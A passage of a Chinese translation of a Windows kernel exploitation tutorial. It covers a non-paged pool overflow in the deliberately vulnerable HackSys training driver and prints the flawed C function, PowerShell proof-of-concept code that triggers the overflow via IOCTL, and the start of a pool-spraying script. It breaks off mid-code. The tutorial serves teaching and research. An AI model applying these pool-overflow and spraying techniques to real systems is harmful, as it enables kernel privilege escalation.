# 【技术分享】Windows exploit开发系列教程：内核利用- >内存池溢出
|
##### 译文声明
本文是翻译文章，文章来源：fuzzysecurity.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
****
**翻译：**[ **维一零** ****](http://bobao.360.cn/member/contribute?uid=32687245)
**预估稿费：260RMB（不服你也来投稿啊！）**
******投稿方式：发送邮件至**[ **linwei#360.cn**](mailto:PI:EMAIL) **，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿******
**前言**
你好，欢迎回到Windows漏洞利用开发系列教程的第16部分。今天我们将使用[@HackSysTeam](https://twitter.com/HackSysTeam)有漏洞的驱动来进行内存池溢出利用。我再次强烈地建议读者在进入这篇文章之前去回顾下面列出的资源，另外关于内存池分配的更多背景知识请见[第15部分](http://www.fuzzysecurity.com/tutorials/expDev/19.html)。关于调试环境的设置细节可以从[第10部分](http://www.fuzzysecurity.com/tutorials/expDev/14.html)找到。
**资源**
[HackSysExtremeVulnerableDriver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)([@HackSysTeam](https://twitter.com/HackSysTeam))
[HackSysTeam-PSKernelPwn](https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn)([@FuzzySec](https://twitter.com/FuzzySec))
[Windows 7内核池利用](http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf)([@kernelpool](https://twitter.com/kernelpool))
[理解内存池破坏第1部分(MSDN)](https://blogs.msdn.microsoft.com/ntdebugging/2013/06/14/understanding-pool-corruption-part-1-buffer-overflows/)
[理解内存池破坏第2部分(MSDN)](https://blogs.msdn.microsoft.com/ntdebugging/2013/08/22/understanding-pool-corruption-part-2-special-pool-for-buffer-overruns/)
[理解内存池破坏第3部分(MSDN)
](https://blogs.msdn.microsoft.com/ntdebugging/2013/12/31/understanding-pool-corruption-part-3-special-pool-for-double-frees/)
**侦察挑战**
让我们带着问题看一下漏洞函数的一部分(在这里)。
    NTSTATUS TriggerPoolOverflow(IN PVOID UserBuffer， IN SIZE_T Size) {
        PVOID KernelBuffer = NULL;
        NTSTATUS Status = STATUS_SUCCESS;
        PAGED_CODE();
        __try {
            DbgPrint("[+] Allocating Pool chunkn");
            // 分配内存块
            KernelBuffer = ExAllocatePoolWithTag(NonPagedPool，
                                                 (SIZE_T)POOL_BUFFER_SIZE，
                                                 (ULONG)POOL_TAG);
            if (!KernelBuffer) {
                // 无法分配内存块
                DbgPrint("[-] Unable to allocate Pool chunkn");
                Status = STATUS_NO_MEMORY;
                return Status;
            }
            else {
                DbgPrint("[+] Pool Tag: %sn"， STRINGIFY(POOL_TAG));
                DbgPrint("[+] Pool Type: %sn"， STRINGIFY(NonPagedPool));
                DbgPrint("[+] Pool Size: 0x%Xn"， (SIZE_T)POOL_BUFFER_SIZE);
                DbgPrint("[+] Pool Chunk: 0x%pn"， KernelBuffer);
            }
            //验证缓冲区是否在用户模式下
            ProbeForRead(UserBuffer， (SIZE_T)POOL_BUFFER_SIZE， (ULONG)__alignof(UCHAR));
            DbgPrint("[+] UserBuffer: 0x%pn"， UserBuffer);
            DbgPrint("[+] UserBuffer Size: 0x%Xn"， Size);
            DbgPrint("[+] KernelBuffer: 0x%pn"， KernelBuffer);
            DbgPrint("[+] KernelBuffer Size: 0x%Xn"， (SIZE_T)POOL_BUFFER_SIZE);
    #ifdef SECURE
            // 安全提示: 这里是安全的因为开发者解析size等于
            // 分配内存块的size即RtlCopyMemory()/memcpy()。
            // 因此， 这里不会溢出
            RtlCopyMemory(KernelBuffer， UserBuffer， (SIZE_T)BUFFER_SIZE);
    #else
            DbgPrint("[+] Triggering Pool Overflown");
            // 漏洞提示: 这里就是带有溢出漏洞的理想内存
            // 因为开发者直接解析用户提供的值为
            // RtlCopyMemory()/memcpy() 而没有校验size是否大于
            // 或等于内存块分配的size
            RtlCopyMemory(KernelBuffer， UserBuffer， Size);
    #endif
            if (KernelBuffer) {
                DbgPrint("[+] Freeing Pool chunkn");
                DbgPrint("[+] Pool Tag: %sn"， STRINGIFY(POOL_TAG));
                DbgPrint("[+] Pool Chunk: 0x%pn"， KernelBuffer);
                // 释放分配的内存块
                ExFreePoolWithTag(KernelBuffer， (ULONG)POOL_TAG);
                KernelBuffer = NULL;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            Status = GetExceptionCode();
            DbgPrint("[-] Exception Code: 0x%Xn"， Status);
        }
        return Status;
    }
漏洞是显而易见的！驱动分配内存块的大小X并复制用户提供的数据给它，但是，它没有检查用户提供的数据是否大于内存分配的大小。因此，任何多余的数据将会溢出到未分页内存池里的相邻内存块！我建议你进一步在IDA查看一下这个函数，比较完整的函数开头可以从下面看到，其显示了内存池标记和分配的内存块大小。
我们可以使用以下的PowerShell POC来调用这个函数。注意，我们使用的是最大可用长度，任何多出的数据将蔓延到下一内存块！
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    public static class EVD
    {
        [DllImport("kernel32.dll"， CharSet = CharSet.Auto， SetLastError = true)]
        public static extern IntPtr CreateFile(
            String lpFileName，
            UInt32 dwDesiredAccess，
            UInt32 dwShareMode，
            IntPtr lpSecurityAttributes，
            UInt32 dwCreationDisposition，
            UInt32 dwFlagsAndAttributes，
            IntPtr hTemplateFile);
        [DllImport("Kernel32.dll"， SetLastError = true)]
        public static extern bool DeviceIoControl(
            IntPtr hDevice，
            int IoControlCode，
            byte[] InBuffer，
            int nInBufferSize，
            byte[] OutBuffer，
            int nOutBufferSize，
            ref int pBytesReturned，
            IntPtr Overlapped);
        [DllImport("kernel32.dll"， SetLastError = true)]
        public static extern void DebugBreak();
    }
    "@
    $hDevice = [EVD]::CreateFile("\.HacksysExtremeVulnerableDriver"， [System。IO。FileAccess]::ReadWrite， [System.IO.FileShare]::ReadWrite， [System。IntPtr]::Zero， 0x3， 0x40000080， [System.IntPtr]::Zero)
    if ($hDevice -eq -1) {
        echo "`n[!] Unable to get driver handle..`n"
        Return
    } else {
        echo "`n[>] Driver information.."
        echo "[+] lpFileName: \.HacksysExtremeVulnerableDriver"
        echo "[+] Handle: $hDevice"
    }
    # HACKSYS_EVD_IOCTL_POOL_OVERFLOW IOCTL = 0x22200F
    #---    $Buffer = [Byte[]](0x41)*0x1F8
    echo "`n[>] Sending buffer.."
    echo "[+] Buffer length: $($Buffer。Length)"
    echo "[+] IOCTL: 0x22200F"
    [EVD]::DeviceIoControl($hDevice， 0x22200F， $Buffer， $Buffer。Length， $null， 0， [ref]0， [System。IntPtr]::Zero) |Out-null
    echo "`n[>] Triggering WinDBG breakpoint.."
    [EVD]::DebugBreak()
正如我们可以看到的，分配的内存块大小为0
x200，而我们的缓冲区正好截止到下一个相邻的内存池头部。让我们再试试，增加分配的大小或者让我们的缓冲区覆盖随后内存块头部的8个字节。
    $Buffer = [Byte[]](0x41)*0x1F8 + [Byte[]](0x42)*0x4 + [Byte[]](0x43)*0x4
这里有很多漏洞我们可以根据内存池的状态来触发，并且我们将随机地覆盖内存块(在本例中是一个二次释放)。不管怎样我们成功蓝屏了并且获得了一个原始的漏洞！
**Pwn万物!**
**游戏计划**
我认为简要地列出一个游戏计划是件好事。我们将(1)
在一个可预测的状态下获得的未分页内存池，(2)触发被控制的内存池溢出，(3)利用内部的内存池去设置一个shellcode回调，(4)释放损坏的内存块去获得代码执行权！
我强烈推荐你阅读Tarjei的文章并回顾本系列的第15部分。这将有助于更详细地解释我们的内存块分配“风水”是如何工作的:p !
**规则化未分页内存池**
在之前的帖子里，我们使用大小为0 x60的IoCompletionReserve对象去喷射未分页内存池。然而在这里，我们的目标对象大小为0
x200，所以我们需要喷射0x200的数据或者可以增加到0x200大小的对象。幸运的是，事件对象的大小为0
x40，并且可以通过乘以8刚好增加到0x200的大小。
以下POC第一次分配10000个事件对象去重组未分页内存池，然后再多5000个以达到可预测的分配。注意到我们dump出最近10个对象句柄然后在WinDBG手动触发断点。
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Security.Principal;
    public static class EVD
    {
        [DllImport("kernel32.dll"， SetLastError = true)]
        public static extern Byte CloseHandle(
            IntPtr hObject);
        [DllImport("kernel32.dll"， SetLastError = true)]
        public static extern int CreateEvent(
            IntPtr lpEventAttributes，
            Byte  bManualReset，
            Byte bInitialState，
            String lpName);
        [DllImport("kernel32.dll"， SetLastError = true)]
        public static extern void DebugBreak();
    }